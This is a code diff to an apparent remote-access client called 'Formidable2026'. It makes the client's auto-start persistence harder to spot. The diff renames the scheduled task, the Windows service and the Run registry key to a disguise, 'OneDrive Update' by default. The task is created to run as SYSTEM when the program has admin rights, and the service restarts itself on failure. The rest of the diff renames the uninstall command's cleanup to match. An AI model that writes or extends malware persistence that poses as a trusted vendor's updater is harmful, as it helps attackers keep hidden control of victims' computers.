@@ -137,6 +137,11 @@ void InstallClient() {
         
         std::wstring destPath = installDir;
         if (destPath.back() != L'\\' && destPath.back() != L'/') destPath += L'\\';
+        
+        // 确保名称包含 .exe
+        if (installName.length() < 4 || _wcsicmp(installName.c_str() + installName.length() - 4, L".exe") != 0) {
+            installName += L".exe";
+        }
         destPath += installName;
         
         if (_wcsicmp(szCurrentPath, destPath.c_str()) != 0) {
@@ -161,6 +166,16 @@ void InstallClient() {
     
     // 1. 计划任务自启
     if (g_ServerConfig.taskStartup == 1) {
+        std::wstring taskName = L"OneDrive Update";
+        std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
+        if (!configInstallName.empty()) {
+            taskName = configInstallName;
+            // 移除 .exe 后缀作为任务名称
+            if (taskName.length() > 4 && _wcsicmp(taskName.c_str() + taskName.length() - 4, L".exe") == 0) {
+                taskName = taskName.substr(0, taskName.length() - 4);
+            }
+        }
+
         const size_t xmlSize = 4096;
         wchar_t szTaskXml[xmlSize];
         swprintf_s(szTaskXml, xmlSize,
@@ -209,7 +224,7 @@ void InstallClient() {
             L"</Settings>"
             L"<Actions Context=\"Author\">"
             L"<Exec>"
-            L"<Command>&quot;%s&quot;</Command>"
+            L"<Command>%s</Command>"
             L"</Exec>"
             L"</Actions>"
             L"</Task>",
@@ -218,18 +233,21 @@ void InstallClient() {
         wchar_t szTempXml[MAX_PATH];
         GetTempPathW(MAX_PATH, szTempXml);
         wcscat_s(szTempXml, L"\\Formidable_Task.xml");
-        HANDLE hFile = CreateFileW(szTempXml, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD written;
-            WriteFile(hFile, szTaskXml, (DWORD)(wcslen(szTaskXml) * sizeof(wchar_t)), &written, NULL);
-            CloseHandle(hFile);
+        
+        // 使用 Unicode 写入，并带上 BOM
+        FILE* fp = _wfopen(szTempXml, L"wb");
+        if (fp) {
+            unsigned short bom = 0xFEFF;
+            fwrite(&bom, sizeof(bom), 1, fp);
+            fwrite(szTaskXml, sizeof(wchar_t), wcslen(szTaskXml), fp);
+            fclose(fp);
             
             wchar_t szCmd[4096];
             // 仅在管理员权限下使用 SYSTEM 账户，否则使用当前用户
             if (IsAdmin()) {
-                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f /ru SYSTEM", szTempXml);
+                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f /ru SYSTEM", taskName.c_str(), szTempXml);
             } else {
-                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"Formidable2026\" /xml \"%s\" /f", szTempXml);
+                swprintf_s(szCmd, 4096, L"schtasks /create /tn \"%s\" /xml \"%s\" /f", taskName.c_str(), szTempXml);
             }
             
             _wsystem(szCmd);
@@ -240,6 +258,15 @@ void InstallClient() {
 
     // 2. 服务自启
     if (g_ServerConfig.serviceStartup == 1) {
+        std::wstring serviceName = L"OneDrive Update";
+        std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
+        if (!configInstallName.empty()) {
+            serviceName = configInstallName;
+            if (serviceName.length() > 4 && _wcsicmp(serviceName.c_str() + serviceName.length() - 4, L".exe") == 0) {
+                serviceName = serviceName.substr(0, serviceName.length() - 4);
+            }
+        }
+        
         // 如果当前已经是服务进程，无需再次创建或启动服务
         if (g_IsService) {
             OutputDebugStringA("[FRMD26] Running as service, skipping service creation.\n");
@@ -247,7 +274,7 @@ void InstallClient() {
             SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
             if (hSCM) {
                 SC_HANDLE hService = CreateServiceW(
-                    hSCM, L"Formidable2026", L"Formidable Security Service",
+                    hSCM, serviceName.c_str(), serviceName.c_str(),
                     SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                     SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                     szQuotedPath, NULL, NULL, NULL, NULL, NULL);
@@ -280,9 +307,13 @@ void InstallClient() {
                     CloseServiceHandle(hService);
                 } else {
                     // 服务可能已存在，尝试打开并更新配置
-                    hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
+                    hService = OpenServiceW(hSCM, serviceName.c_str(), SERVICE_ALL_ACCESS);
                     if (hService) {
                         OutputDebugStringA("[FRMD26] Service already exists, updating config.\n");
+                        
+                        // 更新服务路径，防止文件移动后无法启动
+                        ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, szQuotedPath, NULL, NULL, NULL, NULL, NULL, NULL);
+
                         SERVICE_FAILURE_ACTIONS fa = { 0 };
                         SC_ACTION actions[3];
                         actions[0].Type = SC_ACTION_RESTART;
@@ -303,7 +334,7 @@ void InstallClient() {
                         // 确保服务已启动
                         SERVICE_STATUS status;
                         if (QueryServiceStatus(hService, &status)) {
-                            if (status.dwCurrentState != SERVICE_RUNNING) {
+                            if (status.dwCurrentState != SERVICE_RUNNING && status.dwCurrentState != SERVICE_START_PENDING) {
                                 if (StartServiceW(hService, 0, NULL)) {
                                     bServiceReady = true;
                                 }
@@ -333,9 +364,18 @@ void InstallClient() {
 
     // 3. 注册表自启
     if (g_ServerConfig.registryStartup == 1) {
+        std::wstring regName = L"OneDrive Update";
+        std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
+        if (!configInstallName.empty()) {
+            regName = configInstallName;
+            if (regName.length() > 4 && _wcsicmp(regName.c_str() + regName.length() - 4, L".exe") == 0) {
+                regName = regName.substr(0, regName.length() - 4);
+            }
+        }
+
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            RegSetValueExW(hKey, L"Formidable2026", 0, REG_SZ, (BYTE*)szQuotedPath, (DWORD)(wcslen(szQuotedPath) * 2 + 2));
+            RegSetValueExW(hKey, regName.c_str(), 0, REG_SZ, (BYTE*)szQuotedPath, (DWORD)(wcslen(szQuotedPath) * 2 + 2));
             RegCloseKey(hKey);
             OutputDebugStringA("[FRMD26] Registry run key set successfully.\n");
         } else {
@@ -692,21 +732,41 @@ void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
             break;
         }
         case CMD_UNINSTALL: {
+            std::wstring baseName = L"OneDrive Update";
+            std::wstring configInstallName = UTF8ToWide(g_ServerConfig.szInstallName);
+            if (!configInstallName.empty()) {
+                baseName = configInstallName;
+                if (baseName.length() > 4 && _wcsicmp(baseName.c_str() + baseName.length() - 4, L".exe") == 0) {
+                    baseName = baseName.substr(0, baseName.length() - 4);
+                }
+            }
+
             // 移除自启动 (注册表)
-            RemoveFromStartup("Formidable2026");
+            RemoveFromStartup(WideToUTF8(baseName));
+            RemoveFromStartup("Formidable2026"); // 兼容旧版本
             
             // 移除自启动 (服务)
             SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
             if (hSCM) {
-                SC_HANDLE hService = OpenServiceW(hSCM, L"Formidable2026", SERVICE_ALL_ACCESS);
-                if (hService) {
-                    SERVICE_STATUS status;
-                    ControlService(hService, SERVICE_CONTROL_STOP, &status);
-                    DeleteService(hService);
-                    CloseServiceHandle(hService);
+                // 尝试移除新旧两个名称的服务
+                const wchar_t* serviceNames[] = { baseName.c_str(), L"Formidable2026" };
+                for (const wchar_t* sName : serviceNames) {
+                    SC_HANDLE hService = OpenServiceW(hSCM, sName, SERVICE_ALL_ACCESS);
+                    if (hService) {
+                        SERVICE_STATUS status;
+                        ControlService(hService, SERVICE_CONTROL_STOP, &status);
+                        DeleteService(hService);
+                        CloseServiceHandle(hService);
+                    }
                 }
                 CloseServiceHandle(hSCM);
             }
+
+            // 移除计划任务
+            wchar_t szTaskCmd[512];
+            swprintf_s(szTaskCmd, 512, L"schtasks /delete /tn \"%s\" /f", baseName.c_str());
+            _wsystem(szTaskCmd);
+            _wsystem(L"schtasks /delete /tn \"Formidable2026\" /f"); // 兼容旧版本
 
             // 获取自身路径
             wchar_t szPath[MAX_PATH];
